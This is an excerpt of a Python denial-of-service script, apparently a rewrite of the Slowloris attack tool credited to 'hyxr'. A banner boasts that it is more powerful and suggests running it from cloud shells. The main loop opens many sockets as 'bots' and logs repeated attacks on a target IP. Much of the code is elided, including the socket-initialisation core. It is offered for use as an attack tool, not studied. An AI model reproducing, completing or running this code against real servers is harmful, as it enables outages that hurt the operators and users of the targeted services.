...
parser = argparse.ArgumentParser(
    description="Made by hyxr"
)
print("Rewrited By hyxr")
print("----------------")
print("this project is slowloris but i rewrited to make it even more powerfull added 60lines of new code enjoy :)")
print("----------------")
print("Enjoy dont forget to git clone on linux bash or even repl.it on windows or google cloud shell.")
...
def main():
    ...
    logging.info("Attacking %s with %s bots.", ip, socket_count)

    logging.info("Creating bots...")
    for _ in range(socket_count):
        try:
            logging.debug("Creating bots nr %s", _)
            s = init_socket(ip)
    ...
    while True:
        try:
            logging.info(
                "Attacking with Bots | Bots counter --->: %s", len(list_of_sockets)
            )
            ...
            logging.info("Stopping Hyxr - dos")
            break
